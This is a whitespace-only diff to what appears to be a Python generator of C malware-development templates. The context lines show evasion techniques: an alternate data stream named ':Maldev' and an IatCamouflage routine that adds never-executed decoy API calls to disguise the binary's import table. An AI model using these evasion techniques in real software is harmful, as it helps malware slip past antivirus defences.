@@ -763,7 +763,7 @@ typedef struct _SYSTEM_PROCESS_INFORMATION
     ULONG SessionId;
     ULONG_PTR PageDirectoryBase;
 
-  
+
     SIZE_T PeakVirtualSize;
     SIZE_T VirtualSize;
     ULONG PageFaultCount;
@@ -777,14 +777,14 @@ typedef struct _SYSTEM_PROCESS_INFORMATION
     SIZE_T PeakPagefileUsage;
     SIZE_T PrivatePageCount;
 
-   
+
     LARGE_INTEGER ReadOperationCount;
     LARGE_INTEGER WriteOperationCount;
     LARGE_INTEGER OtherOperationCount;
     LARGE_INTEGER ReadTransferCount;
     LARGE_INTEGER WriteTransferCount;
     LARGE_INTEGER OtherTransferCount;
-    
+
 }} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
 
 
@@ -831,7 +831,7 @@ Common = f"""
 #include "typedef.h"
 
 
-#define MONITOR_TIME   20000 
+#define MONITOR_TIME   20000
 
 
 #define NEW_STREAM L":Maldev"
@@ -994,10 +994,10 @@ PVOID Helper(PVOID* ppAddress) {{
 	if (!pAddress)
 		return NULL;
 
-	
+
 	*(int*)pAddress = RandomCompileTimeSeed() % 0xFF;
 
-	
+
 	*ppAddress = pAddress;
 	return pAddress;
 }}
@@ -1009,10 +1009,10 @@ VOID IatCamouflage() {{
 	PVOID		pAddress = NULL;
 	int* A = (int*)Helper(&pAddress);
 
-	
+
 	if (*A > 350) {{
 
-		
+
 		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
 		i = GetLastError();
 		i = SetCriticalSectionSpinCount(NULL, NULL);
@@ -1025,7 +1025,7 @@ VOID IatCamouflage() {{
 		i = IsDialogMessageW(NULL, NULL);
 	}}
 
-	
+
 	HeapFree(GetProcessHeap(), 0, pAddress);
 }}
 """
